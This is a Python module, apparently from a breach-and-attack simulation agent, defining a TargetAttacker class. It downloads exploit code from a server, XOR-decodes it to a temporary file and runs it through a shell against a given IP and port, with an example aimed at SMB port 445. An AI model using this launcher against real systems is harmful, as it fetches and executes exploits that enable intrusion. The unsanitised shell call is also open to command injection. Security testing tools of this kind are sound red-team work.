import sys
from pathlib import Path
path = Path(__file__).parent.resolve()
parent = path.parents[0]
[sys.path.append(x) for x in map(str, [path, parent]) if x not in sys.path]

import json
import logging
import logging.config
import pathlib
log_config = (pathlib.Path(__file__).parent.resolve().parents[0].joinpath("log_config.json"))
config = json.load(open(str(log_config)))
logging.config.dictConfig(config)
logger = logging.getLogger(__name__)

from processor import Processor
import subprocess

"""
{
    "type": "attack_target",
    "src_ip" : "x.x.x.x",
    "dst_ip" : "y.y.y.y",
    "dst_port" : 445
    "download": f"http://localhost:9000/exploit/{id}",
    "file_size": 1000,
    "usage": "python <FILE> <IP>",
},
"""
class TargetAttacker(Processor):
    signature = b"BAScope"
    FIELDS = ["dst_ip", "dst_port", "download", "file_size", "usage"]

    def __init__(self, cmd):
        super().__init__(cmd)
        self.check_cmd(self.FIELDS)
        self.path = str(parent) + "/tmp/ex.py"
        logger.info(f"[target] cmd: {cmd}")
        logger.debug(f"[target] file: {self.path}")

        return


    def run_cmd(self, debug):
        self.debug = debug
        target_ip = self.cmd["target_ip"]
        self.link = self.cmd['download']  # 공격 코드 다운로드 링크
        target_port = self.cmd['target_port']

        if self.debug:
            pass
        else:
            self.xor_download(self.link, self.path)

        replacements = [
            ("<FILE>", self.path),
            ("<IP>", target_ip),
            ("<PORT>", str(target_port))
        ]
        usage = self.cmd_after_replacement(self.cmd['usage'], replacements)

        subprocess.call(usage, shell=True)

        return


    def report(self, sock = None):
        # attack target 모드에서는 보고할 것이 없음.
        return


if __name__ == '__main__':
    msg = {
        "type": "attack_secu",
        "download": f"http://localhost:9000/exploit/1",
        "target_ip": "172.30.1.26",
        "target_port": 445,
        "usage": "python <FILE> <IP>",
    }

    a = TargetAttacker(msg)
    a.run_cmd(debug = True)
    a.report()

